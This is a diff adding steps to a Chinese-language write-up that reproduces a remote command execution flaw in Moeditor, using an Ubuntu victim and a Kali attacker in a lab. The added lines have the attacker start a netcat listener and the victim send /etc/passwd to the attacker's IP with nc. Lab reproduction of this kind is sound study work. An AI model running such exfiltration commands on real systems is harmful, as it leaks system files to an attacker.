@@ -95,6 +95,18 @@ def cut_blank():
 # 0x02 远程命令执行漏洞复现
 受害机：Ubuntu18.04.2_x64  
 攻击机：Kali-2020.4-vmware-amd64  
+受害机下需要有nc，先测试一下  
+攻击机上执行
+```
+nc -l -p 1337
+```
+受害机上执行
+```
+nc -w 3 192.168.202.129 1337 < /etc/passwd
+```
+攻击机上收到命令执行后的输出，如下图  
+![image](./pic/a.png)
+
 Ubuntu18.04.2_x64下安装https://moeditor.js.org/  
 Kali-2020.4-vmware-amd64下执行：nc -l -p 1337，如下图  
 ![image](./pic/2.png)  
